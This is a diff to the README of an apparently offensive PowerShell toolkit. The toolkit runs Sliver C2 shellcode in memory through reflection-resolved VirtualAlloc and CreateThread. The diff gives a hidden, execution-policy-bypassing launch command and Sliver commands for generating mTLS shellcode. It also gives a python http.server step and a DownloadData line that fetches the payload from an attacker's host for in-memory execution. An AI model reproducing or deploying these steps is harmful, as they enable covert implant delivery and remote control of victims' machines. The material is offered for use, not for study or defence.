@@ -41,22 +41,20 @@ powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File ps-loader.ps1
 
 Executes raw shellcode in memory using only PowerShell reflection — no `Add-Type`, no P/Invoke declarations, no imported modules. Resolves `VirtualAlloc`, `CreateThread`, and `WaitForSingleObject` entirely at runtime via `LookupFunc`.
 
-> ⚠️ **Size:** a full Sliver session implant is **multi-MB** (Go runtime), so pasting
-> it as one inline `[Byte[]] $buf = 0x..,0x..,…` line is impractical. Use a small
-> **stage-1 stager** (Armory `beignet`/`malasada`, a few hundred bytes) as your
-> shellcode, or populate `$buf` at runtime with `WebClient.DownloadData()` and keep
-> the raw blob on your HTTP server.
+A full Sliver implant is multi-MB, so download it at runtime instead of pasting it inline:
 
-**1. Generate your shellcode:**
+**1. Generate the shellcode and host it:**
 ```bash
 sliver > generate --mtls <IP>:443 --format shellcode --save /tmp/sc.bin
-python3 sliver/sliver2arrays.py /tmp/sc.bin --ps1
+python3 -m http.server 80        # serve /tmp/sc.bin from this directory
 ```
 
-**2. Replace the `$buf` in `ps-shellcode-runner.ps1`:**
+**2. Point `$buf` at it in `ps-shellcode-runner.ps1`:**
 ```powershell
-[Byte[]] $buf = 0xfc,0x48,0x83,0xe4,0xf0,...  # ← paste your full shellcode bytes here
+[Byte[]] $buf = (New-Object System.Net.WebClient).DownloadData('http://<IP>/sc.bin')
 ```
+
+For small shellcode (a stager), paste the bytes inline instead — see `sliver/README.md` §4 (staged payloads).
 
 **3. Start your listener:**
 ```bash
